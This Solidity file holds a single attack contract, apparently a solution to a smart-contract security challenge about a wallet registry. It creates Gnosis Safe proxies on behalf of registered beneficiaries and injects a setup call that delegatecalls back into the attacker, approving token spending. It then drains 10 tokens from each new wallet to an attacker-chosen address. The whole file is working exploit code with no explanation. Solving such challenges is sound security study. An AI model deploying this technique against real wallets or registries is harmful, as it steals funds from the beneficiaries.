// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import {WalletRegistry} from "./WalletRegistry.sol";

contract WalletRegistryAttack {
    WalletRegistry public immutable WALLET_REGISTRY;
    GnosisSafeProxyFactory public immutable GNOSIS_SAFE_PROXY_FACTORY;

    constructor(address walletRegistryAddress, address gnosisSafeProxyFactoryAddress) {
        WALLET_REGISTRY = WalletRegistry(walletRegistryAddress);
        GNOSIS_SAFE_PROXY_FACTORY = GnosisSafeProxyFactory(gnosisSafeProxyFactoryAddress);
    }

    function attack(address[] calldata beneficiaries, address to) public {
        IERC20 token = WALLET_REGISTRY.token();
        for (uint256 i; i < beneficiaries.length;) {
            address[] memory owners = new address[](1);
            owners[0] = beneficiaries[i];
            GnosisSafeProxy proxy = GNOSIS_SAFE_PROXY_FACTORY.createProxyWithCallback(
                WALLET_REGISTRY.masterCopy(),
                abi.encodeCall(
                    GnosisSafe.setup,
                    (
                        owners,
                        1,
                        address(this),
                        abi.encodeCall(this.approve, (token, address(this))),
                        address(0),
                        address(0),
                        0,
                        payable(address(0))
                    )
                ),
                block.timestamp,
                IProxyCreationCallback(address(WALLET_REGISTRY))
            );
            token.transferFrom(address(proxy), to, 10 ether);
            unchecked {
                ++i;
            }
        }
    }

    function approve(IERC20 token, address spender) public {
        token.approve(spender, 10 ether);
    }
}
